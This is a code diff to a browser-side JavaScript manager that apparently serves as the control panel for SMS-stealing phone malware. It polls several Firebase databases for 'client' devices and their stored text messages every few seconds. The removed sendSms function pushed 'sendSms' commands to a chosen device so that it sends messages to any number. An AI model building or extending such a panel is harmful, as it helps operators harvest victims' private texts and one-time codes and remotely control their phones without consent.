@@ -1,6 +1,7 @@
 /**
  * FIREBASE MANAGER - Realtime Database
  * Reads devices from 'clients' and messages from 'messages/{deviceId}'
+ * Continuous polling for real-time updates
  */
 
 // ────────────────────────────────────────────────
@@ -12,6 +13,7 @@ let allDevices = [];
 let deviceListeners = {};
 let isInitialized = false;
 let firebaseConfigsCache = null;
+let pollingIntervals = {};
 
 // ────────────────────────────────────────────────
 // CONFIG LOADING - FROM JSON FILE
@@ -88,6 +90,7 @@ async function connectToFirebase(source) {
         console.log(`📢 Connecting to Firebase source: ${id}`);
         console.log(`📢 URL: ${url}`);
 
+        // Test connection using clients.json
         const testUrl = `${url}/clients.json?auth=${key}&shallow=true`;
         const response = await fetch(testUrl);
         
@@ -115,6 +118,11 @@ async function connectToFirebase(source) {
 
 function disconnectFromFirebase(sourceId) {
     try {
+        // Stop all polling for this source
+        if (pollingIntervals[sourceId]) {
+            pollingIntervals[sourceId].forEach(interval => clearInterval(interval));
+            delete pollingIntervals[sourceId];
+        }
         if (firebaseInstances[sourceId]) {
             delete firebaseInstances[sourceId];
             console.log(`📢 Disconnected: ${sourceId}`);
@@ -151,7 +159,6 @@ async function fetchAllDevices() {
 }
 
 function getDeviceStatus(clientData) {
-    // 1. Check direct status field
     if (clientData.status !== undefined) {
         const statusValue = clientData.status;
         if (statusValue === false || 
@@ -164,19 +171,16 @@ function getDeviceStatus(clientData) {
         return 'online';
     }
     
-    // 2. Check command status
     const cmdData = clientData.command || clientData.commands || {};
     if (cmdData.status === 'pending') {
         return 'offline';
     }
     
-    // 3. Check webhookEvent status
     const webhookData = clientData.webhookEvent?.sendSms || {};
     if (webhookData.status === 'pending') {
         return 'offline';
     }
     
-    // 4. Default to online
     return 'online';
 }
 
@@ -251,6 +255,11 @@ async function fetchDevicesFromSource(sourceId) {
 }
 
 function listenToDevices(callback) {
+    // Clear existing device polling
+    if (pollingIntervals.devices) {
+        clearInterval(pollingIntervals.devices);
+    }
+    
     const intervalId = setInterval(async () => {
         try {
             await fetchAllDevices();
@@ -258,15 +267,19 @@ function listenToDevices(callback) {
         } catch (error) {
             console.error('❌ Error polling devices:', error);
         }
-    }, 5000);
+    }, 5000); // Poll every 5 seconds
 
-    window._devicePollInterval = intervalId;
+    pollingIntervals.devices = intervalId;
 }
 
 // ────────────────────────────────────────────────
-// SMS MANAGEMENT - FROM messages/{deviceId}.json
+// SMS MANAGEMENT - CONTINUOUS POLLING
 // ────────────────────────────────────────────────
 
+/**
+ * Fetch SMS messages for a specific device
+ * Uses: /messages/{deviceId}.json?auth=KEY&orderBy="$key"&limitToLast=150
+ */
 async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
     const instance = firebaseInstances[sourceId];
     if (!instance || !instance.connected) {
@@ -276,13 +289,16 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
     try {
         const { url, key } = instance;
         
+        // Build the exact endpoint you specified
         const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
-        console.log(`📢 Fetching messages for device: ${deviceId}`);
+        console.log(`📢 Fetching messages for device: ${deviceId.substring(0, 8)}...`);
         
         const response = await fetch(apiUrl);
         
         if (!response.ok) {
-            console.log(`⚠️ No messages found for device: ${deviceId}`);
+            if (response.status === 404) {
+                console.log(`📢 No messages found for device: ${deviceId.substring(0, 8)}...`);
+            }
             return [];
         }
         
@@ -301,10 +317,8 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
             return bTime - aTime;
         });
         
-        console.log(`📢 Found ${messages.length} messages for device: ${deviceId}`);
-        
+        // Convert to standard format with time parsed
         return messages.map(msg => {
-            // Handle different timestamp formats
             let timeStr = '';
             if (msg.dateTime) {
                 timeStr = msg.dateTime;
@@ -328,105 +342,62 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
         });
         
     } catch (error) {
-        console.error(`❌ Error fetching SMS for device ${deviceId}:`, error);
+        console.error(`❌ Error fetching SMS for device ${deviceId.substring(0, 8)}...:`, error);
         return [];
     }
 }
 
+/**
+ * Listen for SMS updates - CONTINUOUS POLLING
+ * Polls the endpoint every 3 seconds for new messages
+ */
 function listenToSms(deviceId, sourceId, simNumber, callback) {
+    // Clear existing SMS polling for this device
+    const pollKey = `sms_${sourceId}_${deviceId}`;
+    if (pollingIntervals[pollKey]) {
+        clearInterval(pollingIntervals[pollKey]);
+        delete pollingIntervals[pollKey];
+    }
+
+    console.log(`📢 Starting continuous SMS polling for device: ${deviceId.substring(0, 8)}...`);
+    console.log(`📢 Endpoint: /messages/${deviceId}.json?orderBy="$key"&limitToLast=150`);
+
+    // Store last message count to detect new messages
+    let lastMessageCount = 0;
+
+    // Poll every 3 seconds
     const intervalId = setInterval(async () => {
         try {
             const messages = await fetchSmsForDevice(deviceId, sourceId, simNumber);
+            
+            // Check if new messages arrived
+            if (messages.length > lastMessageCount) {
+                console.log(`📢 New SMS messages detected for device: ${deviceId.substring(0, 8)}... (${messages.length} total)`);
+            }
+            
+            lastMessageCount = messages.length;
+            
             if (callback) callback(messages);
         } catch (error) {
             console.error('❌ Error polling SMS:', error);
         }
-    }, 3000);
+    }, 3000); // Poll every 3 seconds
 
-    return () => clearInterval(intervalId);
+    pollingIntervals[pollKey] = intervalId;
+    
+    // Return cleanup function
+    return () => {
+        if (pollingIntervals[pollKey]) {
+            clearInterval(pollingIntervals[pollKey]);
+            delete pollingIntervals[pollKey];
+            console.log(`📢 Stopped SMS polling for device: ${deviceId.substring(0, 8)}...`);
+        }
+    };
 }
 
 // ────────────────────────────────────────────────
-// SEND SMS
+// SEND SMS (Removed - not needed)
 // ────────────────────────────────────────────────
-
-async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
-    const instance = firebaseInstances[sourceId];
-    if (!instance || !instance.connected) {
-        throw new Error('Firebase not connected');
-    }
-
-    try {
-        const { url, key } = instance;
-        
-        const smsData = {
-            Action: "sendSms",
-            action: "sendSms",
-            body: message,
-            command: "sendSms",
-            from: 1,
-            isSended: false,
-            message: message,
-            number: toNumber,
-            sim: 1,
-            simSlot: 1,
-            status: "pending",
-            text: message,
-            timestamp: Date.now(),
-            to: toNumber,
-            type: "sendSms"
-        };
-
-        const getUrl = `${url}/clients/${deviceId}.json?auth=${key}`;
-        const getResponse = await fetch(getUrl);
-        let existingData = {};
-        if (getResponse.ok) {
-            existingData = await getResponse.json();
-        }
-        
-        const updatedData = {
-            ...existingData,
-            command: smsData,
-            webhookEvent: {
-                sendSms: smsData
-            }
-        };
-        
-        const apiUrl = `${url}/clients/${deviceId}.json?auth=${key}`;
-        const response = await fetch(apiUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(updatedData)
-        });
-        
-        if (!response.ok) {
-            throw new Error(`HTTP ${response.status}`);
-        }
-        
-        const msgId = Date.now();
-        const msgUrl = `${url}/messages/${deviceId}/${msgId}.json?auth=${key}`;
-        await fetch(msgUrl, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                id: msgId,
-                message: message,
-                sender: toNumber,
-                type: 'outgoing',
-                dateTime: new Date().toLocaleString()
-            })
-        });
-        
-        return {
-            success: true,
-            id: deviceId,
-            message: 'SMS sent successfully'
-        };
-    } catch (error) {
-        console.error('❌ Error sending SMS:', error);
-        throw error;
-    }
-}
 
 // ────────────────────────────────────────────────
 // EXPOSE TO GLOBAL SCOPE
@@ -441,6 +412,6 @@ window.fetchDevicesFromSource = fetchDevicesFromSource;
 window.listenToDevices = listenToDevices;
 window.fetchSmsForDevice = fetchSmsForDevice;
 window.listenToSms = listenToSms;
-window.sendSms = sendSms;
 window.firebaseInstances = firebaseInstances;
 window.allDevices = allDevices;
+window.pollingIntervals = pollingIntervals;
